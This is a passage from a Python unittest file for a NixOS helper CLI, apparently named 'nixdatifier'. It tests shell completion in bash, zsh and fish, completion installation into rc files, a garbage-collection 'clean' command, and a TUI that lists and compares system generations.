                'source "$1"; enable -n compgen 2>/dev/null || true; COMP_WORDS=("$2" diff 3 ""); COMP_CWORD=3; _nixdatifier; printf "%s\\n" "${COMPREPLY[@]}"',
                "bash",
                str(completion),
                self.cli,
            ],
            env=self.env,
            text=True,
            capture_output=True,
            check=False,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout.splitlines(), ["3", "2", "1"])

    @unittest.skipUnless(shutil.which("zsh"), "zsh is not installed")
    def test_zsh_completion_when_sourced_and_autoloaded(self):
        completion = self.root / "_nixdatifier"
        completion.write_text(self.cli_run("completion", "zsh").stdout)
        for setup in ('source "$1"', 'fpath=("${1:h}" $fpath); autoload -Uz _nixdatifier'):
            result = subprocess.run(
                [
                    "zsh",
                    "-f",
                    "-c",
                    "autoload -Uz compinit; compinit -D; "
                    + setup
                    + '; compadd() { print -rl -- "${@:2}"; }; words=("$2" diff 3 ""); CURRENT=4; _nixdatifier',
                    "zsh",
                    str(completion),
                    self.cli,
                ],
                env=self.env,
                text=True,
                capture_output=True,
                check=False,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertEqual(result.stdout.splitlines(), ["3", "2", "1"])

    def test_completion_install_is_idempotent_and_per_shell(self):
        home = self.root / "home"
        home.mkdir()
        self.env["HOME"] = str(home)
        self.env.pop("ZDOTDIR", None)
        self.env["XDG_CONFIG_HOME"] = str(home / ".config")
        for shell, target in (("bash", ".bashrc"), ("zsh", ".zshrc")):
            for _ in range(2):
                result = self.cli_run("--yes", "completion", "install", shell)
                self.assertEqual(result.returncode, 0, result.stderr)
            text = (home / target).read_text()
            self.assertEqual(text.count(f"completion {shell}"), 1)
        self.assertEqual(self.cli_run("--yes", "completion", "install", "fish").returncode, 0)
        self.assertIn("__nixdatifier_candidates", (home / ".config/fish/completions/nixdatifier.fish").read_text())
        self.assertEqual(self.cli_run("--yes", "completion", "install", "tcsh").returncode, 2)
        dry = self.cli_run("--dry-run", "completion", "install", "bash")
        self.assertEqual(dry.returncode, 0)

    def test_clean_defaults_spare_recent_generations_then_collects(self):
        result = self.cli_run("--yes", "--priv", "none", "clean")
        self.assertEqual(result.returncode, 0, result.stderr)
        calls = self.calls.read_text()
        self.assertNotIn("--delete-generations", calls)
        self.assertIn("nix-collect-garbage", calls)

    def test_menu_is_listed_and_bare_command_without_terminal_is_usage(self):
        self.assertIn("menu", self.cli_run("--help").stdout)
        self.assertEqual(self.cli_run().returncode, 2)
        self.assertEqual(self.cli_run("switch").returncode, 2)

    def tui_run(self, *args, **extra_env):
        state = self.root / "tui-state"
        state.mkdir(exist_ok=True)
        env = {**self.env, "NXD_STATE": str(state), "NXD_CACHE": str(state), "NO_COLOR": "1", **extra_env}
        return subprocess.run(
            [str(Path(self.cli).parent / "tui"), *args],
            env=env,
            text=True,
            capture_output=True,
            timeout=15,
            check=False,
        )

    def test_tui_without_terminal_is_usage(self):
        self.assertEqual(self.tui_run().returncode, 2)

    def test_tui_lists_generations_with_next_boot_and_booted(self):
        rows = [line.split("\t") for line in self.tui_run("_gens").stdout.splitlines()]
        self.assertEqual([r[0] for r in rows], ["3", "2", "1"])
        self.assertIn("next boot", rows[0][1])
        self.assertIn("booted", rows[1][1])

    def test_tui_compare_base_cycles_previous_booted_next_boot(self):
        labels = []
        for _ in range(3):
            self.tui_run("_cyclemode")
            labels.append(self.tui_run("_modelabel").stdout.strip())
        self.assertEqual(labels, ["vs booted", "vs next boot", "vs previous"])
        self.assertIn("no earlier generation", self.tui_run("_gendiff", "1").stdout)
        self.tui_run("_cyclemode")
        self.assertIn("booted generation itself", self.tui_run("_gendiff", "2").stdout)

    def test_tui_change_filters_cycle_and_reload_the_kept_rows(self):
        state = self.root / "tui-state"
        state.mkdir(exist_ok=True)
        (state / "filter").write_text("all\n")
        actions = [self.tui_run("_filter", "next", NXD_CHANGES=str(state / "rows")).stdout for _ in range(4)]
        self.assertIn("grep -a \\^A", actions[0])
        self.assertIn("grep -a \\^R", actions[1])
        self.assertIn("grep -a \\^C", actions[2])
        self.assertTrue(actions[3].startswith("reload(cat "))

    def test_persist_reports_helper_errors_instead_of_empty_tables(self):
        result = self.cli_run("persist", "ls", "/definitely/not/persistent")
        self.assertEqual(result.returncode, 1)
        self.assertEqual(result.stdout, "")

    def test_unknown_command_is_a_usage_error(self):
        self.assertEqual(self.cli_run("frobnicate").returncode, 2)
        self.assertIn("Usage:", self.cli_run("--help").stdout)


if __name__ == "__main__":
    unittest.main()
